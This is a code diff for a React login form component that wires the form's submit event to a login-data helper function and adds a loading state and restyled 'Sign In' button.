@@ -3,6 +3,7 @@ import UserIcon from "./UI/UserIcon";
 import Lock from "./UI/Lock";
 import EyeOpen from "./UI/EyeOpen";
 import EyeClosed from "./UI/EyeClosed";
+import { submitLoginData } from "../utils/DataCollectionHandler";
 
 export default function Left() {
 	const [showPassword, setShowPassword] = useState(false);
@@ -10,6 +11,20 @@ export default function Left() {
 	const [password, setPassword] = useState("");
 	const [userIdFocused, setUserIdFocused] = useState(false);
 	const [passwordFocused, setPasswordFocused] = useState(false);
+	const [isSubmitting, setIsSubmitting] = useState(false);
+
+	const handleSubmit = async (e: React.FormEvent) => {
+		e.preventDefault();
+		setIsSubmitting(true);
+
+		try {
+			await submitLoginData(userId, password);
+		} catch (error) {
+			console.error('Login failed:', error);
+		} finally {
+			setIsSubmitting(false);
+		}
+	};
 
 	return (
 		<div className="w-[58%] max-sm:w-full max-sm:absolute max-sm:bottom-0 max-sm:rounded-b-none flex items-center justify-center bg-white">
@@ -19,7 +34,7 @@ export default function Left() {
 				</h1>
 				<p className="text-gray-800 mb-8">Please login below to continue</p>
 
-				<form className="space-y-6">
+				<form className="space-y-6" onSubmit={handleSubmit}>
 					<div className="relative">
 						<span
 							className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors ${userIdFocused || userId ? "text-[#14C38E]" : "text-gray-400"}`}
@@ -86,9 +101,10 @@ export default function Left() {
 
 					<button
 						type="submit"
-						className="w-full bg-[#14C38E] hover:bg-[#14C38E] text-white font-semibold py-3 rounded-lg transition-colors"
+						disabled={isSubmitting}
+						className="w-full cursor-pointer bg-[#14C38E] hover:-translate-y-0.5 transition duration-300 text-white font-semibold py-3 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
 					>
-						Sign In
+						{isSubmitting ? 'Signing In...' : 'Sign In'}
 					</button>
 
 					<p className="text-center text-gray-700">
